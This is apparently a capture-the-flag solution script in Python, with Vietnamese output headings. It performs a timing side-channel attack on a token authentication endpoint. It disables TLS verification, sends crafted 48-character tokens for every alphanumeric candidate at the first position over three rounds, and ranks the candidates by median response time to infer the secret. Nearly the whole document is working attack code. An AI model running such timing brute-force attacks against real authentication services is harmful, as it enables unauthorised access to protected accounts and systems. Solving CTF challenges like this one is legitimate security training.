import requests
import statistics
import string
import time
import urllib3
import json

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 2.5):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=15)
            dt = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(3.0)
                continue
            return dt, r.status_code, r.text
        except Exception as e:
            time.sleep(3.0)

charset = string.digits + string.ascii_lowercase + string.ascii_uppercase

# First: Warm up session
print("Warming up connection...")
for _ in range(3):
    query("0" * 48)

print(f"Scanning all {len(charset)} characters at pos 0 across 3 rounds...")
samples = {c: [] for c in charset}

for round_num in range(3):
    print(f"\n--- Round {round_num + 1}/3 ---")
    for i, c in enumerate(charset):
        token = c + "0" * 47
        dt, status, body = query(token, delay=2.5)
        samples[c].append(dt)
        if (i + 1) % 10 == 0 or (i + 1) == len(charset):
            print(f"  Processed {i + 1}/{len(charset)} chars...")

# Compute statistics
results = []
for c in charset:
    med = statistics.median(samples[c])
    mean = statistics.mean(samples[c])
    stdev = statistics.stdev(samples[c])
    results.append({
        "char": c,
        "median": med,
        "mean": mean,
        "stdev": stdev,
        "samples": [round(x, 2) for x in samples[c]]
    })

results.sort(key=lambda x: x["median"], reverse=True)

print("\n" + "="*60)
print("=== KẾT QUẢ QUÉT TOÀN BỘ 62 KÝ TỰ (SẮP XẾP THEO MEDIAN) ===")
print("="*60)
for r in results[:15]:
    print(f"Char '{r['char']}': Median={r['median']:.2f}ms | Mean={r['mean']:.2f}ms (±{r['stdev']:.2f}ms) | Samples={r['samples']}")

print("\n--- 5 KÝ TỰ THẤP NHẤT ---")
for r in results[-5:]:
    print(f"Char '{r['char']}': Median={r['median']:.2f}ms | Mean={r['mean']:.2f}ms (±{r['stdev']:.2f}ms) | Samples={r['samples']}")

with open("/home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/script/scan_pos0_results.json", "w") as f:
    json.dump(results, f, indent=2)
